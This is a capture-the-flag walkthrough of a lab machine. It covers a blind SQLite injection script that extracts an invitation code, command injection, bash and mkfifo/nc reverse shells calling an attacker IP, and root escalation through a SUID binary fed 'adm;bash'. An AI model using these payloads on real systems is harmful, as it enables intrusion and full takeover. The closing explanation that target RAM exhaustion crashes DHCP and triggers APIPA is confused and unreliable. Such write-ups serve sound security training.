- This exercise taught us a basic yet essential lesson: **Always test an IP for open ports.** Do not rely on default ports.

     If we have an **IP** with port **8080**, we should test it as: `xxx.xxx.x.xxx:8080`. This allows us to find non-obvious information that developers often leave on alternative ports.

<img width="1662" height="853" alt="Captura de pantalla 2026-02-14 184255" src="https://github.com/user-attachments/assets/d44e6981-7c38-4468-8d38-c3d0d9ec9ad1" />


-  As we can see, the default port **80** returned nothing, but port **8080** revealed a page requesting an **invitation code**.

   **Fuzzing Strategy:** We could use fuzzing here, but since this CTF has very limited RAM, we must be surgical with our wordlists.
   
   **Execution:** We performed fuzzing based on the request captured in **Burp Suite**.

<img width="2522" height="787" alt="Captura de pantalla 2026-02-14 192510" src="https://github.com/user-attachments/assets/5db950d0-70cb-412d-9bd1-b19cf3c582cf" />


```
wfuzz -c -w /opt/SecLists/Fuzzing/special-chars.txt -d 'password=FUZZ' http://192.168.1.100:8080/login
```

<img width="1657" height="1285" alt="Captura de pantalla 2026-02-14 192734" src="https://github.com/user-attachments/assets/311c5ca1-1591-4e3a-8b4c-efc15a325ce6" />


- We noticed an interesting response when using a **double quote (** `"` **)**. Let's see what happens when we use it as the invitation code.


<img width="2047" height="1237" alt="Captura de pantalla 2026-02-14 193055" src="https://github.com/user-attachments/assets/fe670f77-738f-48ba-ba9e-32cb001b3183" />
The error reveals the backend is using **SQLite**. It also exposes the query structure, showing a table named `code` and a column named `password`.


- I developed a script to automate a character-by-character injection to extract the password.


```
#!/usr/bin/env python3

import requests
import string
import urllib3
import time
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'http://192.168.1.100:8080/login'
characters = string.ascii_lowercase + string.digits + ','
password = ''

for i in tqdm(range(1,100)):
    for char in characters:
        time.sleep(2) # To avoid crashing the low-RAM service
        payload = f'felicia" OR (SELECT substr(password,{i},1) from code)=\'{char}\'-- -'
        carga = { "password": payload }
        r = requests.post(url, data=carga, verify=False)
        if "WRONG INFORMATION" not in r.text:
            password += char
            print(f"[+] Digit found --> {char}")
            print(f"[+] Password ----> {password}")
            break
```


**Password obtained:** `myinvitecode123`

<img width="2227" height="1125" alt="Captura de pantalla 2026-02-15 034047" src="https://github.com/user-attachments/assets/da3fcd45-599d-4737-8b99-03ffaef51974" />


- Entering the code grants access to a scanner that appears to interact with **bash**. Let's test for command injection.


<img width="1425" height="770" alt="Captura de pantalla 2026-02-15 034131" src="https://github.com/user-attachments/assets/bd2fbd4c-6980-489f-acad-8450b694fd49" />
It responds. Now, let's aim for a **reverse shell**.

```
bash; bash -i >& /dev/tcp/192.168.1.197:4444 0>&1
```

- The standard reverse shell didn't work. I switched to a **named pipe (mkfifo)** shell (common in PentestMonkey’s cheat sheets) because it's more versatile on modern systems.

```
bash; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.197 4444 >/tmp/f
```

<img width="1565" height="402" alt="Captura de pantalla 2026-02-15 035113" src="https://github.com/user-attachments/assets/8afc930c-1038-4972-858c-1a4308695f8d" />

- We have a shell! Time to stabilize it:

```
# Victim
script /dev/null -c bash
Ctrl + Z

# Attacker
stty raw -echo; fg

# Victim
reset xterm
```


- We found a binary with the SUID bit set. Analyzing the source code `update_cloudav.c`:

```
char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setuid(0);
system(command);
```

The binary takes **one argument** (`argv[1]`). However, because it uses `system()`, we can "poison" that argument with a semicolon (`;`) to execute a second command as **root**.

```
./update_cloudav 'adm;bash'
```

- **Why the quotes?** They force the shell to treat the entire string as a single argument for the binary. Without them, our current shell would execute `bash` as a low-privilege user after the binary finished. With them, the SUID binary executes `bash` for us as **root**.

---

### Key Points

#### 1 
- Identifying the type of file that is processed with the **requests** library is key; when we make a request, whether it is **POST** or **GET**, it doesn't matter which one, we have to identify if it is **json**, **cookie**, **data**, or **file**.
    
    If we check the `Content-Type` header, we will find out:
    
    - `application/json` → JSON bod
    - `application/x-www-form-urlencoded` → form data
    - `multipart/form-data` → file upload
        
- A key point in this is to identify if any of these three formats works with a **cookie**, and it is identified in the following way:

| **Elemento**     | **Ubicación en Burp** | **Parámetro en requests**   | **Función**                                   |
| ---------------- | --------------------- | --------------------------- | --------------------------------------------- |
| **Content-Type** | Header                | `json=`, `data=` o `files=` | Define el formato de la carga útil (Payload). |
| **Cookie**       | Header                | `cookies=`                  | Define quién envía la petición (Sesión).      |

#### 2
- Something relevant that this **CTF** teaches us is the role of the **RAM** of a team **x** during a real audit.
    
    The fact that this **CTF** works with such a limited **RAM** and that we have to do **fuzzing** serves as an example to understand how, during an audit, due to the high **network traffic** we might encounter, it can lead to crashing the **DHCP service**. This service provides us with an **IP** periodically, like a contract; making it so that when the **DHCP service** has to renew our **IP** and finds a crashed **RAM**, this prevents communication between them and the system enters an emergency protocol called **APIPA**, which generates an emergency **IP**.
    
- With the **APIPA** emergency protocol activated, we can recover our old **IP** by assigning it manually; however, taking into account that we have to delete the provisional one so we only have one active and not two. This gives us clarity during an audit, for example, not to think that a **firewall** or something blocked us.
